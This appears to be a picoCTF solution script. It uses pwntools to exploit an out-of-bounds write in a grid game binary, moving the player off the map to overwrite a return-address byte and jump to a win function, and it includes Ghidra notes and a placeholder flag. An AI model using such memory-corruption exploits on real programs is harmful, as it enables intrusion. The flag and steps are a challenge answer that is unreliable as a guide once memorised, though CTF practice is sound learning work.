#!/usr/bin/env python3


"""
Ghidra decompile

<code>

<attack>
Guessing we need to overwrite return to win as no stack canary

Only seems possible to overwrite two bytes of data with player tile.

Possible that return address is only two bytes?

Original return address: 0x8049709
New return address:      0x8049770


So need to change player number to 0x70 and smash the stack to overwrite the return address.

Return address is 3c on stack and pointer is 60

So need to do 68-28=40

player_position * 0x5a + coord_array + player_position[1]

-1*0x5a + coord_array + 51

We start at (4,4) and need to be at (51,-1)
So send 47 'd' and 5 'w'

picoCTF{gamer_jump1ng_4r0unD_XXXXXXXX}
"""

from pwn import *

context.terminal = ['tmux', 'splitw', '-v']


BINARY = './game'

code = ELF(BINARY)
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    io = remote(sys.argv[2].split(':')[0], int(sys.argv[2].split(':')[1]))
else:
    io = gdb.debug(BINARY, gdbscript = '''
                   b main
                   b *move_player+203
                   c
    ''')



p = log.progress("Exploiting")

payload = str('lp').encode('ASCII')
payload += str('d'*47).encode('ASCII')
payload += str('w'*5).encode('ASCII')

io.sendline(payload)
io.interactive()
